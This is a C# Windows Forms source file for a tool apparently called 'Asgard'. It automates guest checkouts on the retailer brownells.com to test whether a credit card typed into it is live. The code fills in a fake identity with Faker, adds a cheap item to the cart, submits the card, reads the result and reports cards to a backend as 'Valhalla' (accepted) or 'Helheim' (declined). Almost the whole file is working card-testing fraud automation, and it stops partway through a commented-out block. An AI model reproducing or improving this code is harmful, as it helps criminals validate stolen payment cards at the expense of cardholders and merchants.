using Bogus;

using CefSharp.OffScreen;

using FontAwesome.Sharp;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using RestSharp;

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Asgard
{
    public partial class Home : Form, IForm
    {
        private ChromiumWebBrowser browser;

        private string CC { set; get; }
        private int Id { set; get; }
        private string Token { set; get; }
        private int GateId { set; get; }
        private CancellationTokenSource tokenCancel;

        private const string initialUrl = "https://www.brownells.com/search/index.htm?avs|Special-Filters_1=In+Stock&avs|Price_1=*+TO+9xzzx99&psize=96";

        private static readonly string[] lastInitialUrl = new[] {
            "&s_o=Relevance",
            "&s_o=CalculatedOnSaleFlag (Descending)",
            "&s_o=MostPopular (Descending)",
            "&s_o=New Products (Descending)",
            "&s_o=CalculatedUSAFlag (Descending)",
            "&s_o=CalculatedAvgOverallReviewFormula (Descending)",
            "&s_o=CalculatedFullReviews (Descending)",
            "&s_o=Price (Ascending)",
            "&s_o=Price (Descending)",
            "&s_o=Name (Ascending)",
            "&s_o=Name (Descending)",
            "&s_o=Manufacturer (Ascending)",
            "&s_o=Manufacturer (Descending)",
        };

        private Faker Faker { set; get; }
        private bool forsetiError = false;

        public Home()
        {
            InitializeComponent();
            //MessageBox.Show("H1");
            Faker = new Faker();
            Control.CheckForIllegalCrossThreadCalls = false;
        }

        private void Home_Load(object sender, EventArgs e)
        {
            //MessageBox.Show("H2");
            Yggdrasil.God = "odin";
            GateId = 1;
            TextBoxCC.ContextMenuStrip = new ContextMenuStrip();
            MaskedTextBoxDate.ContextMenuStrip = new ContextMenuStrip();
            TextBoxCvv.ContextMenuStrip = new ContextMenuStrip();
            TextBoxCC.Placeholder("################");
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.Placeholder("###");
            IconButtonStop.IconColor = Color.Black;
            IconButtonStop.Enabled = false;

            PictureBoxLoadWelcome.Hide();
            PictureBoxLoadListValhalla.Hide();
            PictureBoxLoadNotifications.Hide();

            Task.Run(() => LoadWelcome());
            Task.Run(() => LoadValhalla());

            TimerSync.Start();
        }


        private async void LoadWelcome()
        {
            try
            {
                PictureBoxLoadWelcome.Show();

                dynamic welcome = await Asatru.GetWelcome(Id, Token);
                if (welcome != null)
                {
                    if (welcome.userDetails != null)
                    {
                        LabelGetUsername.Text = welcome.userDetails.username.Value;
                    }

                    if (welcome.lastSession != null)
                    {
                        string date = (string)welcome.lastSession.create_at.Value;
                        LabelGetLastSesion.Text = Asatru.FormatDate(date);
                    }

                    if (welcome.valhalla != null)
                    {
                        LabelGetCountVallhala.Text = welcome.valhalla.valhalla.Value;
                    }

                    if (welcome.helheim != null)
                    {
                        LabelGetCountHelheim.Text = welcome.helheim.helheim.Value;
                    }

                    if (welcome.planDetails != null)
                    {
                        LabelGetPlan.Text = welcome.planDetails.plan.Value;
                        LabelGetRunes.Text = welcome.planDetails.total_runes.Value + "/" + welcome.planDetails.initial_runes.Value;
                    }
                }
                PictureBoxLoadWelcome.Hide();
            }
            catch (Exception) { }
        }

        public async void LoadCountHelheim()
        {
            try
            {
                PictureBoxLoadWelcome.Show();
                dynamic helheim = await Asatru.GetCountHelheim(Id, Token);
                if (helheim != null)
                {
                    LabelGetCountHelheim.Text = helheim.helheim.Value;
                }
                PictureBoxLoadWelcome.Hide();
            }
            catch (Exception) { }
        }

        public async void LoadCountValhalla()
        {
            try
            {
                this.PictureBoxLoadWelcome.Show();
                dynamic valhalla = await Asatru.GetCountValhalla(Id, Token);
                if (valhalla != null)
                {
                    LabelGetCountVallhala.Text = valhalla.valhalla.Value;
                }
                PictureBoxLoadWelcome.Hide();
            }
            catch (Exception) { }

        }

        public async void LoadPlanDetails()
        {
            try
            {
                //MessageBox.Show("H5");
                PictureBoxLoadWelcome.Show();
                dynamic planDetails = await Asatru.GetPlanDetails(Id, Token);
                if (planDetails != null)
                {
                    LabelGetPlan.Text = planDetails.plan.Value;
                    LabelGetRunes.Text = planDetails.total_runes.Value + "/" + planDetails.initial_runes.Value;
                    //MessageBox.Show("H5.1");
                }
                else
                {
                    LabelGetPlan.Text = "-";
                    LabelGetRunes.Text = "-";
                }

                PictureBoxLoadWelcome.Hide();
            }
            catch (Exception) { }
        }


        public async void LoadValhalla()
        {
            try
            {
                //MessageBox.Show("H4");
                PictureBoxLoadListValhalla.Show();

                dynamic valhalla = await Asatru.GetLastValhalla(Id, Token);
                if (valhalla != null)
                {
                    string listValhalla = string.Empty;
                    for (int i = 0; i < valhalla.Count; i++)
                    {
                        string date = (string)valhalla[i].create_at.Value;
                        listValhalla += " [" + valhalla[i].god.Value + "] " + valhalla[i].cc.Value + " [" + Asatru.FormatDate(date) + "]\r\n";
                    }
                    TextBoxValhalla.Text = listValhalla;
                    //MessageBox.Show("H4.1");
                }
                PictureBoxLoadListValhalla.Hide();
            }
            catch (Exception) { }
        }

        public void InitializeParameters(params object[] parameters)
        {
            if (parameters.Length == 2)
            {
                Id = (int)parameters[0];
                Token = parameters[1].ToString();
            }
        }

        private void PanelCheck_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxCC = new Rectangle(TextBoxCC.Location.X, TextBoxCC.Location.Y, TextBoxCC.ClientSize.Width, TextBoxCC.ClientSize.Height);
            borderTextBoxCC.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCC, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderMaskedTextBoxDate = new Rectangle(MaskedTextBoxDate.Location.X, MaskedTextBoxDate.Location.Y, MaskedTextBoxDate.ClientSize.Width, MaskedTextBoxDate.ClientSize.Height);
            borderMaskedTextBoxDate.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderMaskedTextBoxDate, Color.White, ButtonBorderStyle.Solid);

            Rectangle borderTextBoxCvv = new Rectangle(TextBoxCvv.Location.X, TextBoxCvv.Location.Y, TextBoxCvv.ClientSize.Width, TextBoxCvv.ClientSize.Height);
            borderTextBoxCvv.Inflate(1, 1);
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxCvv, Color.White, ButtonBorderStyle.Solid);
        }

        private void TextBoxCC_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("################");
        }
        private void TextBoxCC_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("################");
            CC = textBox.Text;
            //CompleteCC(textBox);
        }
        private void TextBoxCC_KeyUp(object sender, KeyEventArgs e)
        {
            try
            {
                if (CC == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            }
            catch (Exception) { /*throw;*/ }
        }
        private void TextBoxCC_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                if (CC == string.Empty && (e.KeyCode == Keys.D0 || e.KeyCode == Keys.NumPad0))
                {
                    e.SuppressKeyPress = true;
                    return;
                }

                if (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9)
                {
                    CC += (char)e.KeyValue;
                }
                else if (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.NumPad9)
                {
                    CC += Convert.ToChar(e.KeyCode - 48);
                }
                else if (e.KeyCode == Keys.Back)
                {
                    int startIndex = CC.Length - 1;
                    if (startIndex >= 0)
                    {
                        CC = CC.Remove(startIndex);
                    }
                    else
                    {
                        e.SuppressKeyPress = true;
                        return;
                    }
                }
                else if (e.KeyCode == Keys.Tab && CC.Length < 11)
                {
                    e.SuppressKeyPress = true;
                    return;
                }
                else if (e.KeyCode == Keys.V && e.Control)
                {
                    e.SuppressKeyPress = false;
                }
                else
                {
                    e.SuppressKeyPress = true;
                    return;
                }
            }
            catch (Exception) { /*throw;*/ }
        }
        private void TextBoxCC_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            CC = textBox.Text;
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                int textLenght = textBox.TextLength;
                for (int i = 0; i < textLenght; i++)
                {
                    if (i > 11 && i < 20)
                    {
                        if (Regex.IsMatch(textBox.Text.Substring(i, 1), "[^0-9]"))
                        {
                            textBox.Clear();
                            break;
                        }
                    }
                    //else if (Regex.IsMatch(textBox.Text.Substring(i, 1), @"[^x-xX-X0-9]"))
                    //{
                    //    textBox.Clear();
                    //    break;
                    //}
                }
                //CompleteCC(textBox);
                CC = textBox.Text;
                //Task.Run(() => InfoCCList(CC));
            }
        }
        //private void TextBoxCC_Validating(object sender, CancelEventArgs e)
        //{
        //    TextBox textBox = (TextBox)sender;
        //    string text = textBox.Text;
        //    if (text == "################")
        //    {
        //        text = string.Empty;
        //    }

        //    if (string.IsNullOrEmpty(text) && string.IsNullOrEmpty(MaskedTextBoxDate.Text) && string.IsNullOrEmpty(TextBoxCvv.Text))
        //    {
        //        IconButtonCheck.IconColor = Color.Black;
        //        IconButtonCheck.Enabled = false;
        //    }
        //    else
        //    {
        //        //if (text.Length < 6)
        //        //{
        //        //    IconButtonCheck.IconColor = Color.Black;
        //        //    IconButtonCheck.Enabled = false;
        //        //}
        //        //else
        //        //{
        //        //Odin odin = new Odin();
        //        //    if (!odin.ValidateBin(text))
        //        //    {
        //        //        IconButtonCheck.IconColor = Color.Black;
        //        //        IconButtonCheck.Enabled = false;
        //        //    }
        //        //else
        //        //{
        //        IconButtonCheck.IconColor = Color.White;
        //        IconButtonCheck.Enabled = true;
        //        //    //IconButtonClear.IconColor = Color.White;
        //        //    //IconButtonClear.Enabled = true;

        //        //}
        //        //}
        //    }
        //}

        private void MaskedTextBoxDate_Enter(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            maskedTextBox.Placeholder("dd/aa");
            MaskedTextBoxDate.Mask = "##/##";
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            this.BeginInvoke((MethodInvoker)delegate ()
            {
                if (text.Length > 2)
                {
                    maskedTextBox.Select(text.Length + 1, 0);
                }
                else
                {
                    maskedTextBox.Select(text.Length, 0);
                }
            });
        }
        private void MaskedTextBoxDate_Leave(object sender, EventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (string.IsNullOrEmpty(text) || text.Length < 4)
            {
                maskedTextBox.Clear();
                MaskedTextBoxDate.Mask = "";
                maskedTextBox.Placeholder("dd/aa");
                maskedTextBox.Select(0, 0);
            }
        }
        private void MaskedTextBoxDate_KeyUp(object sender, KeyEventArgs e)
        {
            MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
            string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
            if (text.Length > 0)
            {
                if (text.Length == 1)
                {
                    if (Regex.IsMatch(text, @"([^0-1])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 2)
                {
                    if (Regex.IsMatch(text, @"^(0[^1-9]|1[^0-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 3)
                {
                    if (Regex.IsMatch(text, @"([^2-2])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
                else if (text.Length == 4)
                {
                    if (Regex.IsMatch(text, @"([^0-9])$"))
                    {
                        maskedTextBox.Text = maskedTextBox.Text.Remove(text.Length - 1);
                    }
                }
            }
        }

        private void MaskedTextBoxDate_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                MaskedTextBox maskedTextBox = (MaskedTextBox)sender;
                string text = maskedTextBox.Text.Replace("/", String.Empty).Trim();
                if (text.Length > 0)
                {
                    for (int i = 0; i < text.Length; i++)
                    {
                        if (i == 0)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-1])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 1)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"^(0[^1-9]|1[^0-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 2)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^2-2])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                        else if (i == 3)
                        {
                            if (Regex.IsMatch(text.Substring(i, 1), @"([^0-9])$"))
                            {
                                maskedTextBox.Clear();
                                break;
                            }
                        }
                    }
                }
            }
        }

        private void TextBoxCvv_Enter(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.Placeholder("###");
        }

        private void TextBoxCvv_Leave(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            //if (textBox.TextLength < cvvDigits.Length)
            //{
            //    textBox.Clear();
            //}
            textBox.Placeholder("###");
        }
        private void TextBoxCvv_KeyUp(object sender, KeyEventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            if (Regex.IsMatch(textBox.Text, "[^0-9]"))
            {
                textBox.Text = textBox.Text.Remove(textBox.TextLength - 1);
            }
        }

        private void TextBoxCvv_TextChanged(object sender, EventArgs e)
        {
            if (ModifierKeys.HasFlag(Keys.Control))
            {
                TextBox textBox = (TextBox)sender;
                if (Regex.IsMatch(textBox.Text, "[^0-9]"))
                {
                    textBox.Clear();
                    textBox.Select(0, 0);
                }
            }
        }

        private async void TimerSync_Tick(object sender, EventArgs e)
        {
            LoadCountValhalla();
            LoadCountHelheim();
            LoadPlanDetails();
            LoadValhalla();
        }

        #region Web Browser
        #region Load Browser
        private async Task InvokeOdin()
        {
            bool odin = false;
            try
            {
                //await ConsoleProgressGeneral("Invocando a Odin.", 0);

                browser = new ChromiumWebBrowser();
                await Task.Delay(500);

                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;

                odin = await Task<bool>.Run(async () =>
                {
                    if (!token.IsCancellationRequested)
                    {
                        return await LoadBrowser();
                    }
                    else
                    {
                        return false;
                    }
                }, token);
            }
            catch (Exception) { }

            await browser.Kill("www.brownells.com");
            await tokenCancel.Kill();

            if (odin)
            {
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
            }
            else
            {
                //if (!running)
                //{

                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonCheck.IconColor = Color.White;
                IconButtonCheck.Enabled = true;
                IconPictureBoxCheck.Show();
                IconPictureBoxValhalla.Hide();
                PictureBoxWaitCheck.Hide();
                IconPictureBoxHelheim.Hide();
                IconButtonStop.IconColor = Color.Black;
                IconButtonStop.Enabled = false;
                //IconButtonValkyrie.IconColor = Color.White;
                //IconButtonValkyrie.Enabled = true;
                //if (CreditCards != null)
                //{
                //    if (CreditCards.Count > 0)
                //    {
                //        IconButtonVerify.IconColor = Color.White;
                //        IconButtonVerify.Enabled = true;

                //    }
                //    else
                //    {
                //        TextBoxCreditCards.Clear();
                //        IconButtonVerify.IconColor = Color.Black;
                //        IconButtonVerify.Enabled = false;
                //    }
                //}
                //}
                //else if (requiredValkyrie)
                //{
                //    await ConsoleProgressGeneral("Odin requiere el apoyo de Valquirias.", 0, "Fail");
                //    IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                //    IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                //    IconButtonClear.IconColor = Color.White;
                //    IconButtonClear.Enabled = true;
                //    IconButtonValkyrie.IconColor = Color.White;
                //    IconButtonValkyrie.Enabled = true;
                //    if (CreditCards != null)
                //    {
                //        if (CreditCards.Count > 0)
                //        {
                //            IconButtonVerify.IconColor = Color.White;
                //            IconButtonVerify.Enabled = true;

                //        }
                //        else
                //        {
                //            TextBoxCreditCards.Clear();
                //            IconButtonVerify.IconColor = Color.Black;
                //            IconButtonVerify.Enabled = false;
                //        }
                //    }
                //}
                //else if (CreditCards.Count > 0)
                //{
                //    await ConsoleProgressGeneral("Odin requiere un sacrificio.", 0, "Fail");
                //    await ConsoleProgressGeneral("Ofreciendo un sacrificio a Odin.", 0, "Success");
                //await InvokeOdin();
                //}
                //else
                //{
                //    await ConsoleProgressGeneral("Odin encontro un elfo oscuro y se detuvo.", 0, "Fail");
                //}
            }
            //await Task.Delay(2000);
            //await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
            //await ConsoleProgressDetail("", 0);
        }
        private async Task<bool> LoadBrowser()
        {
            bool loadBrowser = false;
            try
            {
                string url = initialUrl + lastInitialUrl[new Random().Next(0, lastInitialUrl.Length)];
                loadBrowser = await browser.LoadPage(url);
            }
            catch (Exception) { }

            await Task.Delay(500);
            if (loadBrowser)
            {
                return await LoadPage();
            }
            return false;
        }
        private async Task<bool> LoadPage()
        {
            try
            {
                return await StartOdin();
            }
            catch (Exception) { }
            return false;
        }
        #endregion

        #region  Gate Step By Step
        private async Task<bool> StartOdin()
        {

            try
            {
                //browser.Screenshot("1.Load");
                //await ConsoleProgressGeneral("Insertando algoritmos de extensión.", 10);
                await browser.ExecuteScript("function alert(){ return false; }");
            }
            catch (Exception) { }

            bool divItemStock = await browser.ElementVisible("#ctl00_ContentPlaceHolderColMain_divProdList > div:nth-child(2).media.listing", "ExceptionStartOdin");
            if (divItemStock)
            {
                return await Item();
            }

            //await ConsoleProgressGeneral("Insertando algoritmos de extensión. ¡Fallo!", 10, "Fail");
            return false;
        }
        private async Task<bool> Item()
        {
            //if (running)
            //{
            bool item = false;
            try
            {
                string clickItemInStock = @"let allItems = document.querySelectorAll('#ctl00_ContentPlaceHolderColMain_divProdList > div > div > div.group2 > p.status > span:not(.outOfStock)');
                    let randItem = allItems[Math.floor(Math.random() * (allItems.length - 1)) + 1].parentNode.parentNode.parentNode.firstElementChild;
                    randItem.click();";
                await browser.ExecuteScript(clickItemInStock);
            }
            catch (Exception) { /*throw;*/ }

            bool buttonAddCart = await browser.ElementVisible("#btnAdd", "ExceptionItemAddCart");
            if (buttonAddCart)
            {
                item = await RandomAddToCart();
            }
            else
            {
                bool anchorRounds = await browser.ElementVisible("#divBoxRounds > a:nth-child(1)", "ExceptionItemRoundsAddToCartAnchorRounds");
                if (anchorRounds)
                {
                    item = await RoundsAddToCart();
                }
            }
            return item;
            //}
            //else { return false; }
        }
        private async Task<bool> RandomAddToCart()
        {
            //if (running)
            //{
            try
            {
                //browser.Screenshot("3.Item");
                //await ConsoleProgressGeneral("Trazando retícula de Splines.", 30);
                string clickRandomAddToCart = @"let elementsPrice = document.querySelectorAll('#priceContainer > span > p > span');
                    let skuButtonsPriceLow = [];
                    let skuButton;
                    for(let elementPrice of elementsPrice)
                    {
                        let price = elementPrice.textContent.replace('$','');
                        if(price < 10)
                        {
	                        skuButtonsPriceLow.push(elementPrice.parentNode.parentNode.parentNode.parentNode.childNodes[5].childNodes[2].getAttribute('sku'));
                        }
                    }
                    do
                    {
                        let skuElementClick = skuButtonsPriceLow[Math.floor(Math.random() *  skuButtonsPriceLow.length)];
                        skuButton = document.querySelector('#btnAdd[sku=\''+skuElementClick+'\']:not(.btnColor5)');
                    }
                    while(skuButton == null);
                    skuButton.click();";
                await browser.ExecuteScript(clickRandomAddToCart);

            }
            catch (Exception) { }
            bool anchorViewCart = await browser.ElementVisible("p.gritter-link.linkEase > a", "ExceptionRandomAddToCart");

            if (anchorViewCart)
            {
                return await ViewCart();
            }
            //await ConsoleProgressGeneral("Trazando retícula de Splines. ¡Fallo!", 30, "Fail");
            return false;
            //}
            //else { return false; }
        }

        private async Task<bool> RoundsAddToCart()
        {
            //if (running)
            //{
            try
            {
                bool anchorRounds = await browser.ElementVisible("#divBoxRounds > a:nth-child(1)", "ExceptionRoundsAddToCartAnchorRounds");
                if (anchorRounds)
                {
                    string clickRounds = $"document.querySelector('#divBoxRounds > a:nth-child(1)').click();";
                    bool rounds = (bool)await browser.ExecuteScript(clickRounds);
                    if (rounds)
                    {
                        bool buttonAddToCartAlt = await browser.ElementVisible("#ctl00_ContentPlaceHolderColMain_ucApperal_btnAdd", "ExceptionRoundsAddToCartButtonAddToCartAlt");
                        if (buttonAddToCartAlt)
                        {
                            //browser.Screenshot("2.ItemAltRounds");
                            string clickAddToCart = @"document.querySelector('#ctl00_ContentPlaceHolderColMain_ucApperal_btnAdd').click();";
                            bool preAddtoCart = (bool)await browser.ExecuteScript(clickAddToCart);
                            if (preAddtoCart)
                            {
                                bool inputAgeYes = await browser.ElementVisible("#btnAgeYes", "ExceptionRoundsAddToCartInputAgeYes");
                                if (inputAgeYes)
                                {
                                    string clickAgeYes = @"document.querySelector('#btnAgeYes').click();";
                                    await browser.ExecuteScript(clickAgeYes);
                                }
                            }

                        }
                    }
                }
            }
            catch (Exception) { }

            bool anchorViewCart = await browser.ElementVisible("p.gritter-link.linkEase > a", "ExceptionRoundsAddToCart");
            if (anchorViewCart)
            {
                return await ViewCart();
            }
            return false;
            //}
            //else { return false; }
        }
        private async Task<bool> ViewCart()
        {
            //if (running)
            //{
            try
            {
                string clickViewcart = @"document.querySelector('p.gritter-link.linkEase > a').click();";
                await browser.ExecuteScript(clickViewcart);
            }
            catch (Exception) { }
            bool anchorCheckout = await browser.ElementVisible("#btnCheckoutTop", "ExceptionViewCart");
            if (anchorCheckout)
            {
                return await Checkout();
            }
            return false;
            //}
            //else { return false; }
        }
        private async Task<bool> Checkout()
        {
            //if (running)
            //{
            try
            {
                string clickCheckout = @"document.querySelector('#btnCheckoutTop').click();";
                await browser.ExecuteScript(clickCheckout);
            }
            catch (Exception) { }

            bool inputEmail = await browser.ElementVisible("#txtEmail", "ExceptionCheckout");
            if (inputEmail)
            {
                return await Guest();
            }
            return false;
            //}
            //else { return false; }
        }
        private async Task<bool> Guest()
        {
            //if (running)
            //{
            try
            {

                await browser.Click("#txtEmail");
                string valueInputEmail = $"document.querySelector('#txtEmail').value ='{Faker.Internet.Email()}';" +
                    @"document.querySelector('#btnGuestLogin').click();";
                await browser.ExecuteScript(valueInputEmail);
            }
            catch (Exception) { }

            bool radioInStorePickup = await browser.ElementVisible("#radDeliveryInStore", "ExceptionGuest");
            if (radioInStorePickup)
            {
                return await InStorePickup();
            }

            return false;
            //}
            //else { return false; }
        }

        private async Task<bool> InStorePickup()
        {
            //if (running)
            //{

            try
            {
                await browser.Click("#radDeliveryInStore");
            }
            catch (Exception) { }

            bool selectPickup = await browser.ElementVisible("#selPickup", "ExceptionInStorePickup");
            if (selectPickup)
            {
                return await SelectPickup();
            }
            return false;
            //}
            //else { return false; }
        }
        private async Task<bool> SelectPickup()
        {
            //if (running)
            //{
            try
            {
                string selectedPickup = @"let select = document.getElementById('selPickup');
                    let items = select.getElementsByTagName('option');
                    let index = Math.floor(Math.random() * (items.length - 1)) + 1;
                    select.selectedIndex = index;
                    if(index == 2)
                    {
                        document.querySelector('#liPickupPerson').setAttribute('style','display: block;');
                        document.querySelector('#txtPickupPerson').value = " + $"'{Faker.Name.FullName()}'" + @";
                    }
                    document.querySelector('#btnSaveAndContinue').click();";
                await browser.ExecuteScript(selectedPickup);
            }
            catch (Exception) { }
            bool inputCreditCard = await browser.ElementVisible("#txtCreditCardNumber", "ExceptionSelectPickup");
            if (inputCreditCard)
            {
                return await Last();
            }
            return false;
            //}
            //else { return false; }
        }
        private async Task<bool> Last()
        {
            //if (running)
            //{
            try
            {
                //string listLiveCreditCard = string.Empty;
                //string listDieCreditCard = string.Empty;
                //if (CreditCards.Count > 0)
                //{
                //LiveCreditCards = new List<List<string>>();
                //DieCreditCards = new List<List<string>>();
                //int creditCardsCount = CreditCards.Count;
                //int x = 0;
                //for (int i = 0; i < creditCardsCount;)
                //{
                //if (running)
                //{
                string number = TextBoxCC.Text;
                string month = int.Parse(MaskedTextBoxDate.Text.Substring(0, 2)).ToString();
                string year = (int.Parse(MaskedTextBoxDate.Text.Substring(MaskedTextBoxDate.Text.Length - 1, 1)) + 1).ToString();
                string cvv = string.Empty;
                if (TextBoxCvv.Text.Length == 4)
                {
                    cvv = "0000";
                }
                else
                {
                    cvv = "000";
                }

                bool latestData = await LatestData(number, month, year, cvv);
                if (latestData)
                {
                    bool forseti = await Forseti();
                    if (forseti)
                    {
                        Task.Run(() => Asatru.SetValhalla(Id, Token, GateId, $"{number}|{MaskedTextBoxDate.Text.Substring(0, 2)}|20{MaskedTextBoxDate.Text.Substring(MaskedTextBoxDate.Text.Length - 1, 1)}|{cvv}", true));
                        IconPictureBoxCheck.Hide();
                        IconPictureBoxHelheim.Hide();
                        PictureBoxWaitCheck.Hide();
                        IconPictureBoxValhalla.Show();
                        IconButtonStop.IconColor = Color.Black;
                        IconButtonStop.Enabled = false;
                        IconButtonClear.IconColor = Color.White;
                        IconButtonClear.Enabled = true;
                        //browser.Screenshot(x.ToString() + ".Valhalla_" + number);
                        //await ConsoleProgressDetail(number, 100, "Success");
                        //if (TextBoxValhalla.Text == string.Empty)
                        //{
                        //listLiveCreditCard += string.Join("|", CreditCards[i].ToArray());
                        //await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                        //}
                        //else
                        //{
                        //listLiveCreditCard = TextBoxValhalla.Text;
                        //listLiveCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                        //await Asatru.SetValhalla(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                        //}
                        //await Task.Run(() => checker.LoadPlanDetails());
                        //await Task.Run(() => home.LoadCountValhalla());
                        //await Task.Run(() => home.LoadPlanDetails());
                        //await Task.Run(() => home.LoadValhalla());
                        //ReduceListCreditCards();
                        //TextBoxValhalla.Text = listLiveCreditCard;
                        //double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                        //await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
                        //await Task.Delay(50);
                        //x++;
                        return false;
                    }
                    else
                    {
                        if (!forsetiError)
                        {
                            Task.Run(() => Asatru.SetHelheim(Id, Token, GateId, $"{number}|{MaskedTextBoxDate.Text.Substring(0, 2)}|20{MaskedTextBoxDate.Text.Substring(MaskedTextBoxDate.Text.Length - 1, 1)}|{TextBoxCvv.Text}"));
                            IconPictureBoxCheck.Hide();
                            IconPictureBoxValhalla.Hide();
                            PictureBoxWaitCheck.Hide();
                            IconPictureBoxHelheim.Show();
                            IconButtonStop.IconColor = Color.Black;
                            IconButtonStop.Enabled = false;
                            IconButtonClear.IconColor = Color.White;
                            IconButtonClear.Enabled = true;
                            //browser.Screenshot(x.ToString() + ".Helheim_" + number);
                            //await ConsoleProgressDetail(number, 100, "Fail");
                            //if (TextBoxHelheim.Text == string.Empty)
                            //{
                            //    listDieCreditCard += string.Join("|", CreditCards[i].ToArray());
                            //    await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                            //}
                            //else
                            //{
                            //    listDieCreditCard = TextBoxHelheim.Text;
                            //    listDieCreditCard += "\r\n" + string.Join("|", CreditCards[i].ToArray());
                            //    await Asatru.SetHelheim(UserId, Token, GateId, string.Join("|", CreditCards[i].ToArray()));
                            //}
                            //await Task.Run(() => home.LoadCountHelheim());
                            //ReduceListCreditCards();
                            //TextBoxHelheim.Text = listDieCreditCard;
                            //double progress = Convert.ToDouble((x + 1) * 100 / creditCardsCount);
                            //await ConsoleProgressGeneral("Trazando retículas irreticulizables.", (int)Math.Round(progress));
                            //await Task.Delay(50);
                            //x++;
                            //continue;
                        }
                        else
                        {
                            forsetiError = true;
                            return false;
                        }
                    }
                }
                else { return false; }
                //}
                //else { return false; }
                //}
                //}
            }
            catch (Exception) { }

            //if (CreditCards.Count > 0)
            //{
            //    return false;
            //}
            //else
            //{
            //    return true;
            //}
            //}
            //else { return false; }
            return false;
        }
        #endregion

        #region Methods
        private async Task<bool> LatestData(string number, string month, string year, string cvv)
        {
            //if (running)
            //{

            try
            {
                //browser.Screenshot("LatestData");

                string fillPayment = @"document.querySelector('#aspnetForm').reset();
                document.querySelector('#radPaymentCreditCard').click();" +
               $"document.querySelector('#txtCreditCardNumber').value = '{number}';" +
               $"document.querySelector('#ccExpirationMonth').selectedIndex = {month};" +
               $"document.querySelector('#ccExpirationYear').selectedIndex = {year};" +
               $"document.querySelector('#txtCVV').value ='{cvv}';" +
               $"document.querySelector('#txtFirstName').value ='{Faker.Name.FirstName()}';" +
               $"document.querySelector('#txtLastName').value ='{Faker.Name.LastName()}';" +
               $"document.querySelector('#txtShippingAddr1').value ='{Faker.Address.StreetAddress()}';" +
               $"document.querySelector('#txtCity').value ='{Faker.Address.City()}';" +
               @"let selectState = document.querySelector('#selState');
                            let states = selectState.querySelectorAll('option');
                            let index = Math.floor(Math.random() * (states.length - 1)) + 1;
                            selectState.selectedIndex = index;
                            document.querySelector('#selCountry').selectedIndex = 238;" +
               $"document.querySelector('#txtZip').value ='{Faker.Address.ZipCode("#####")}';" +
               $"document.querySelector('#txtPhone').value ='{Faker.Phone.PhoneNumber()}';";

                await browser.ExecuteScript(fillPayment);
                await Task.Delay(1000);
                string buttonSaveContinue = @"document.querySelector('#btnSaveAndContinue').click();";
                await browser.ExecuteScript(buttonSaveContinue);

            }
            catch (Exception) { }

            bool buttonOk = await browser.ElementVisible("div.fancybox-wrap.fancybox-desktop.fancybox-type-html.fancybox-opened > div > div > div > div > div > div > input", "ExceptionLastButtonOk");
            if (buttonOk)
            {
                return true;
            }
            else
            {
                bool buttonPlaceOrder = await browser.ElementVisible("#btnPlaceOrder", "ExceptionLastButtonPlaceOrder");
                if (buttonPlaceOrder)
                {
                    return true;
                }

            }
            //browser.Screenshot("LatestData3");
            return false;
            //}
            //else { return false; }
        }

        //private async Task ClickButtonOK()
        //{
        //    //if (running)
